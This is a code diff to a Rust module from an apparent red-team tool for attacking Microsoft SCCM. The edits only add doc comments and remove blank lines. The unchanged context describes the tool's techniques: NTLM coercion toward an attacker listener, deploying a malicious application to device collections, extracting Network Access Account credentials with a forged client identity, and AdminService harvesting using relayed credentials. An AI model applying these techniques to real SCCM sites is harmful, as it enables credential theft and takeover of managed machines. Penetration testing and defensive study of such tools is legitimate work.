@@ -30,20 +30,31 @@ use tracing::{info, warn};
 /// Result of a single SCCM abuse technique.
 #[derive(Debug, Clone)]
 pub struct SccmAbuseResult {
+    /// technique field
     pub technique: SccmTechnique,
+    /// success field
     pub success: bool,
+    /// affected targets field
     pub affected_targets: Vec<String>,
+    /// credentials field
     pub credentials: Vec<NaaCredential>,
+    /// command output field
     pub command_output: Option<String>,
+    /// notes field
     pub notes: Vec<String>,
 }
 
 /// SCCM abuse technique discriminant.
 #[derive(Debug, Clone, PartialEq)]
 pub enum SccmTechnique {
+    /// `ClientPushCoercion` variant
     ClientPushCoercion,
+    /// `ApplicationDeployment` variant
+    #[allow(missing_docs)]
     ApplicationDeployment { collection_id: String },
+    /// `NaaCredentialExtraction` variant
     NaaCredentialExtraction,
+    /// `AdminServiceHarvest` variant
     AdminServiceHarvest,
 }
 
@@ -66,11 +77,9 @@ impl std::fmt::Display for SccmTechnique {
 
 /// Trigger the SCCM site server to **push** its NTLM credentials toward
 /// `attacker_listener` by requesting client installation on that host.
-///
 /// This exploits SCCM's Automatic Site Assignment: when given a new hostname,
 /// the site server attempts SMB/RPC authentication to it, producing a
 /// Net-NTLMv2 hash that can be captured or relayed.
-///
 /// # Requirements
 /// - Attacker must have the `Push Installation > Allow` permission on the
 ///   site (granted to `Authenticated Users` by default in many SCCM installs)
@@ -203,7 +212,6 @@ Write-Host "[*] Capture the Net-NTLMv2 hash with Responder / ntlmrelayx on $Targ
 
 /// Deploy a payload to all devices in `collection_id` by creating a temporary
 /// SCCM application with a **script** deployment type that runs `command`.
-///
 /// On Windows: native WMI SDK calls.
 /// On other platforms: generates equivalent PowerShell SDK script.
 pub async fn deploy_malicious_application(
@@ -288,7 +296,6 @@ Write-Host "[!] CLEANUP: Remove-CMApplication -Name $AppName -Force after execut
 // ─────────────────────────────────────────────────────────────
 
 /// Full NAA credential extraction orchestration.
-///
 /// 1. Discover the site
 /// 2. Request machine policy (using a forged SCCM client identity)
 /// 3. Decrypt embedded Network Access Account credentials
@@ -375,9 +382,7 @@ pub async fn extract_naa_credentials(config: &SccmScannerConfig) -> Result<SccmA
 
 /// Use the SCCM AdminService REST API to extract sensitive policy bodies
 /// without requiring WMI or direct database access.
-///
 /// Endpoint: `https://<SMS_Provider>/AdminService/v1.0/`
-///
 /// Auth note: Requires a valid AD credential (or PtH via NTLM relay).
 pub async fn admin_service_harvest(
     target: &str,
